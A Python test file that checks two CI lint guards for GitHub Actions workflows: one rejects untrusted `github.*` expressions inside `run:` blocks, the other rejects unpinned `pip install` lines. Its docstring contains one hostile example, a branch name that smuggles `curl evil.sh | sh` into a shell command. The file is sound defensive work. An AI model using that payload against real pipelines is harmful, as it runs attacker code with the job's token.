"""Issue #574: workflow ``run:`` blocks must not interpolate ``${{ github.* }}``.

GitHub expands workflow expressions BEFORE the shell parses a ``run:``
script, so untrusted ``github.*`` values (``head_ref`` / ``title`` /
``event.pull_request.*`` on a fork PR — ``ref_name`` on a crafted tag)
become expression injection: a branch named
``develop"; curl evil.sh | sh; #`` executes in the runner with the job's
GITHUB_TOKEN. The fix is env-var indirection (issue #301's PR-body guard
pattern); these tests import :mod:`check_workflow_run_injections` — the
same module the CI lint job runs — and verify it over the committed
workflows plus synthetic fixtures. The local suite is the load-bearing
fence; the CI step is the wall for forks without the dev environment.

Issue #577: workflow ``pip install`` lines must be pinned.
-----------------------------------------------------------
The same yaml-walk shape now also fences Python package installs: a
``pip install <tool>`` inside a workflow ``run:`` block resolves to the
mutable PyPI latest, so the CI guards themselves (pyyaml parsing every
PR's manifests, ruff, pip-audit) ran unverified code with the job's
GITHUB_TOKEN — the one unpinned trust root left after #389 (SHA-pinned
actions) and #173/#479 (hash-pinned lockfiles). The fix installs every
CI tool from the hash-pinned ``requirements-ci.txt`` third lockfile;
:func:`workflow_pip_install_violations` structurally rejects any install
lacking ``--require-hashes`` / an ``-r`` pinned-file / an exact ``==``
pin, with two allowlisted shapes (the editable project install and the
pip self-upgrade). tests/test_dependency_drift.py separately pins the
file's CONTENT (exact pins, hashes, tool presence).
"""

from __future__ import annotations

import importlib.util
import pathlib
import re
import textwrap

import yaml

ROOT = pathlib.Path(__file__).resolve().parents[1]
SCRIPTS_DIR = ROOT / "scripts"

# Import via importlib so the file is loaded by path (same convention as
# tests/test_auto_close_issues.py) — scripts/ is not a package.
_spec = importlib.util.spec_from_file_location(
    "check_workflow_run_injections",
    SCRIPTS_DIR / "check_workflow_run_injections.py",
)
assert _spec is not None and _spec.loader is not None
check_workflow_run_injections = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(check_workflow_run_injections)


def write_workflow(directory: pathlib.Path, body: str, name: str = "fixture.yml") -> pathlib.Path:
    """Write a synthetic workflow under ``directory`` and return its path."""
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / name
    path.write_text(textwrap.dedent(body), encoding="utf-8")
    return path


def test_repo_workflows_pass_the_injection_guard() -> None:
    """The committed .github/workflows carry no github.* inside run: blocks."""
    violations = check_workflow_run_injections.scan_dir(ROOT / ".github" / "workflows")
    assert violations == []


def test_guard_flags_injected_shapes(tmp_path: pathlib.Path) -> None:
    """A tmp tree shaped like the pre-#574 ci.yml is flagged — proves the
    guard catches the exact historical pattern (one violation per affected
    step, naming the file, the job, and the step)."""
    write_workflow(
        tmp_path,
        """
        name: fixture
        on: push
        jobs:
          guard-branch-pairing:
            runs-on: ubuntu-latest
            steps:
              - name: main may only receive PRs from develop
                run: |
                  if [ "${{ github.head_ref }}" != "develop" ]; then
                    echo "::error::got '${{ github.head_ref }}'."
                    exit 1
                  fi
        """,
    )
    violations = check_workflow_run_injections.scan_dir(tmp_path)
    assert len(violations) == 1
    assert "guard-branch-pairing" in violations[0]
    assert "main may only receive PRs from develop" in violations[0]
    assert "issue #574" in violations[0]


def test_guard_flags_untrusted_expressions_in_plain_run_scalars(
    tmp_path: pathlib.Path,
) -> None:
    """Plain (non-block) run: scalars are scanned too — `- run: echo
    ${{ github.<untrusted> }}` is just as injectable, for every value the
    issue enumerates (head_ref / title / event.pull_request.*)."""
    untrusted = [
        "github.head_ref",
        "github.title",
        "github.event.pull_request.body",
        "github.event.pull_request.title",
    ]
    for index, expr in enumerate(untrusted):
        write_workflow(
            tmp_path,
            f"""
            name: fixture-{index}
            on: push
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo "value=${{{{ {expr} }}}}"
            """,
            name=f"fixture-{index}.yml",
        )
    violations = check_workflow_run_injections.scan_dir(tmp_path)
    assert len(violations) == len(untrusted)
    for expr in untrusted:
        # each untrusted expression surfaces in its own violation, quoted
        # with the offending line
        assert any(expr in v for v in violations), expr


def test_guard_allows_env_indirection_shape(tmp_path: pathlib.Path) -> None:
    """The post-#574 shape is NOT flagged: env:/with:/if: blocks carry the
    `${{ github.* }}`` indirection, and the run: block reads only quoted
    shell variables (mirror of the #301 PR-body guard)."""
    write_workflow(
        tmp_path,
        """
        name: fixture
        on:
          pull_request:
            branches: [develop, main]
        jobs:
          guard-branch-pairing:
            if: github.event_name == 'pull_request' && github.base_ref == 'main'
            runs-on: ubuntu-latest
            steps:
              - name: main may only receive PRs from develop
                env:
                  HEAD_REF: ${{ github.head_ref }}
                run: |
                  if [ "${HEAD_REF}" != "develop" ]; then
                    echo "::error::got '${HEAD_REF}'."
                    exit 1
                  fi
              - name: login
                uses: docker/login-action@0000000000000000000000000000000000000000
                with:
                  username: ${{ github.actor }}
                  password: ${{ secrets.GITHUB_TOKEN }}
        """,
    )
    violations = check_workflow_run_injections.scan_dir(tmp_path)
    assert violations == []


# ---------------------------------------------------------------------------
# Issue #577: no unpinned `pip install` inside workflow run: blocks.
# ---------------------------------------------------------------------------

# A `pip install` line anywhere in a run: script (the invocation may be
# `pip install ...` or `python -m pip install ...` — the substring match
# covers both; `python -m pip` merely routes through the interpreter).
_PIP_INSTALL_RE = re.compile(r"(?:^|\s)pip\s+install(?:\s|$)")

# An exact `name==version` pin (single token, both sides non-empty) — the
# only bare-spec shape the fence tolerates (acceptance: an install must
# carry --require-hashes OR a version pin).
_EXACT_TOKEN_RE = re.compile(r"^[A-Za-z0-9]([A-Za-z0-9._-]*[A-Za-z0-9])?==\S+$")

# Flags that make an install clean by delegating the pins elsewhere.
_PIN_DELEGATING_FLAGS = frozenset({"--require-hashes", "-r", "--requirement", "-c", "--constraint"})

# Allowlisted shapes that can never be hash-pinned: the editable install
# of the project under test (source verified by the checkout SHA, not
# PyPI) and the pip self-upgrade (the installer bootstrapping itself —
# vendored by the runner image / setup-python, not resolved from a spec).
_EDITABLE_FLAGS = frozenset({"-e", "--editable"})


def pip_install_line_is_pinned(line: str) -> bool:
    """Whether one ``pip install ...`` shell line installs verified code.

    Clean shapes (issue #577 acceptance):

    * ``--require-hashes`` (directly), or
    * ``-r``/``--requirement``/``-c``/``--constraint`` — the pins live in
      the referenced file (e.g. ``-r requirements-ci.txt``), or
    * ``-e``/``--editable`` — the project-under-test install, or
    * a pip self-upgrade whose only package argument is ``pip`` itself, or
    * every package token is an exact ``name==version`` pin.

    Everything else — bare names (``pip install pyyaml``) and floors
    (``pip install 'ruff>=0.16'``) — resolves to mutable PyPI latest and
    is a violation.
    """
    tokens = [token.strip("'\"") for token in line.split()]
    try:
        install_at = next(i for i, t in enumerate(tokens) if t == "install")
    except StopIteration:
        return True  # not actually a pip install line (defensive)
    args = tokens[install_at + 1 :]
    if any(flag in args for flag in _PIN_DELEGATING_FLAGS | _EDITABLE_FLAGS):
        return True
    packages = [a for a in args if not a.startswith("-")]
    if not packages:
        return True  # `pip install` with no args is a usage error, not a risk
    if packages == ["pip"]:
        return True  # self-upgrade of the bootstrapped installer
    return all(_EXACT_TOKEN_RE.match(pkg) for pkg in packages)


def workflow_pip_install_violations(path: pathlib.Path, doc: object) -> list[str]:
    """Every unpinned ``pip install`` found inside a ``run:`` block of ``doc``.

    Same structural walk as the #574 guard: only ``jobs.<id>.steps[].run``
    string values are scanned, one shell line at a time.
    """
    violations: list[str] = []
    if not isinstance(doc, dict):
        return violations
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return violations
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            run = step.get("run")
            if not isinstance(run, str):
                continue
            for line in run.splitlines():
                if _PIP_INSTALL_RE.search(line) and not pip_install_line_is_pinned(line):
                    violations.append(
                        f"{path}: job '{job_id}', step "
                        f"'{check_workflow_run_injections.step_label(step)}' "
                        f"runs an unpinned pip install (offending line: "
                        f"{line.strip()!r}) — install from a hash-pinned file "
                        f"(`pip install --require-hashes -r requirements-ci.txt`) "
                        f"or pin exactly (issue #577)"
                    )
    return violations


def scan_dir_pip_installs(root: pathlib.Path) -> list[str]:
    """Scan every workflow file under ``root`` (`.yml` + `.yaml`) for
    unpinned pip installs (issue #577)."""
    violations: list[str] = []
    paths = sorted(root.glob("*.yml")) + sorted(root.glob("*.yaml"))
    for path in paths:
        try:
            doc = yaml.safe_load(path.read_text(encoding="utf-8"))
        except yaml.YAMLError as exc:
            violations.append(f"{path}: not parseable YAML: {exc}")
            continue
        violations.extend(workflow_pip_install_violations(path, doc))
    return violations


def test_repo_workflows_have_no_unpinned_pip_installs() -> None:
    """The committed .github/workflows install Python packages only from
    pinned sources (#577): every `pip install` in every run: block carries
    --require-hashes, references a pinned file via -r/-c, is an exact ==
    pin, or is one of the two allowlisted shapes (editable project
    install, pip self-upgrade)."""
    violations = scan_dir_pip_installs(ROOT / ".github" / "workflows")
    assert violations == []


def test_ci_jobs_install_tools_from_requirements_ci() -> None:
    """ci.yml's lint and audit jobs both install their tooling from the
    hash-pinned requirements-ci.txt (#577) — the direct fence on the fix:
    deleting that step (or pointing it back at `pip install pip-audit`)
    fails here even before the unpinned-install scan notices."""
    doc = yaml.safe_load((ROOT / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8"))
    for job_id in ("lint", "audit"):
        steps = doc["jobs"][job_id]["steps"]
        runs = [s.get("run", "") for s in steps if isinstance(s, dict)]
        assert any(
            "--require-hashes -r requirements-ci.txt" in run for run in runs
        ), f"ci.yml job '{job_id}' must install CI tooling via `pip install --require-hashes -r requirements-ci.txt` (issue #577)"


def test_pip_install_guard_flags_pre_577_bare_installs(tmp_path: pathlib.Path) -> None:
    """A workflow shaped like the pre-#577 ci.yml is flagged — proves the
    guard catches the exact historical patterns: the bare ``pip install
    pyyaml`` in the #150/#574 guard steps, the ``'ruff>=0.16'`` floor, and
    the audit job's bare ``pip install pip-audit``."""
    write_workflow(
        tmp_path,
        """
        name: fixture
        on: push
        jobs:
          lint:
            runs-on: ubuntu-latest
            steps:
              - name: "Reject github.* interpolation inside run: blocks (issue #574)"
                run: |
                  pip install pyyaml  # the guard script uses yaml.safe_load
                  python scripts/check_workflow_run_injections.py
              - run: pip install 'ruff>=0.16' # same floor as pyproject dev deps (#68)
              - run: ruff check .
          audit:
            runs-on: ubuntu-latest
            steps:
              - name: pip-audit requirements.lock (issue #481)
                run: |
                  set -euo pipefail
                  pip install pip-audit
                  pip-audit --require-hashes -r requirements.lock
        """,
    )
    violations = scan_dir_pip_installs(tmp_path)
    assert len(violations) == 3
    joined = "\n".join(violations)
    assert "pip install pyyaml" in joined
    assert "ruff>=0.16" in joined
    assert "pip install pip-audit" in joined
    for job_id in ("lint", "audit"):
        assert job_id in joined
    assert "issue #577" in joined


def test_pip_install_guard_allows_legitimate_shapes(tmp_path: pathlib.Path) -> None:
    """The post-#577 shape (and the pre-existing legitimate shapes in the
    test job) are NOT flagged: --require-hashes installs (with or without
    -r), the editable project install, the pip self-upgrade, and a bare
    exact ``==`` pin (the acceptance-minimum shape)."""
    write_workflow(
        tmp_path,
        """
        name: fixture
        on: push
        jobs:
          lint:
            runs-on: ubuntu-latest
            steps:
              - name: Install CI tooling from hash-pinned requirements-ci.txt (#577)
                run: pip install --require-hashes -r requirements-ci.txt
              - run: pip install --no-cache-dir --require-hashes -r requirements.lock
              - run: pip install --no-cache-dir -e '.[dev]'
              - run: python -m pip install --upgrade pip
              - run: pip install 'ruff==0.16.4'  # exact pin — acceptance-minimum shape
        """,
    )
    violations = scan_dir_pip_installs(tmp_path)
    assert violations == []
